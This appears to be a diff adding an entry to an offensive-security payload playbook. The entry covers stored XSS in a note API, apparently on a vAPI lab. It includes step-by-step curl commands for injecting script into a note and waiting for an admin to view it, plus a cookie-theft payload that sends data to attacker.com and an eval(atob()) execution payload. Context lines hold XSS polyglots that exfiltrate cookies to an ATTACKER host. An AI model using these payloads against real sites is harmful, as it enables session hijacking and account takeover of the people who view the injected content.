@@ -166,3 +166,46 @@ SELFCONTAINED='"><img src=x onerror="var x=new XMLHttpRequest();x.open(\"GET\",\
 # Step 6: Polyglot for various contexts (attribute, tag, JS string)
 POLYGLOT="--></script><script>fetch('https://ATTACKER:8443/xss?d='+document.cookie)</script><img src=x onerror=fetch('https://ATTACKER:8443/xss2?d='+document.cookie) '"
 ```
+
+### vAPI: Stored XSS via Unsanitized Note Endpoint [added: 2026-05]
+- **Tags:** #XSS #StoredXSS #StickyNotes #HTML #RCE #API #Sanitization
+- **Trigger:** Note-taking or sticky-note API endpoint stores user input without HTML sanitization; response Content-Type is text/html (not application/json)
+- **Prereq:** Authenticated access to note creation API + endpoint returns notes with text/html content type + stored content reflected in browser
+- **Yields:** Stored XSS — JavaScript executes in any user's browser when they view the malicious note (admin, team members)
+- **Opsec:** Med
+- **Context:** StickyNotes endpoint stores HTML without encoding. When notes are retrieved with `?format=html` or default text/html response type, JavaScript payloads execute. This can escalate to admin RCE or session hijacking if admin views the note.
+- **Payload/Method:**
+```bash
+# Step 1 — Authenticate to the application
+curl -X POST 'http://target/auth/login' \
+  -d '{"username":"user","password":"pass"}' \
+  -H "Content-Type: application/json" \
+  -c cookies.txt -b cookies.txt
+
+# Step 2 — Create a note with XSS payload
+curl -X POST 'http://target/api/notes/create' \
+  -H "Content-Type: application/json" \
+  -d '{"title":"Test","content":"<script>alert(\"flag{xss_message}\")</script>"}' \
+  -b cookies.txt
+
+# Step 3 — Retrieve note in HTML format (if format param exists)
+curl -s 'http://target/api/notes/1?html=true' -b cookies.txt
+# OR: 
+curl -s 'http://target/api/notes/1' \
+  -H "Accept: text/html" \
+  -b cookies.txt
+
+# Response header: Content-Type: text/html; charset=UTF-8
+# Response body: <html>...<script>alert(...)</script></html>
+# → Script executes in browser
+
+# Step 4 — Wait for admin/other user to view the note
+# When admin accesses the note, XSS fires in their session
+
+# Step 5 — Payload variations for credential theft or redirect
+# Cookie theft payload:
+# <script>new Image().src='http://attacker.com/?c='+document.cookie;</script>
+
+# DOM-based RCE payload:
+# <script>eval(atob('BASE64_ENCODED_COMMAND'))</script>
+```
